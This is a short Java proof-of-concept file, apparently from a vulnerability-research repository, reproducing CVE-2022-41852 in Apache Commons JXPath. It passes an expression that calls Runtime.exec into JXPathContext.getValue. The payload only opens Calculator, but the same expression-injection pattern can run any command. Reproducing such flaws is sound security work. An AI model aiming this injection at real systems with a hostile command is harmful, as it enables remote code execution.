package org.n1es.vuln.jxpath;

import org.apache.commons.jxpath.JXPathContext;

public class JxPathRceTest {


	public static void main(String[] args) {
		// 有限制poc
		jxPathRceTest("exec(java.lang.Runtime.getRuntime(),\"open -a Calculator\")");
	}

	/**
	 * CVE编号: CVE-2022-41852 Apache Commons JXpath RCE
	 * 影响版本: Apache Commons JXpath <= 1.3
	 * 漏洞原理: getValue解析表达式可以调用任意方法或加载类
	 * 参考来源地址 https://blog.csdn.net/Xxy605/article/details/127303526
	 * @param payload rce payload
	 */
	private static void jxPathRceTest(String payload) {
		JXPathContext context = JXPathContext.newContext(new Object());
		context.getValue(payload);
	}
}
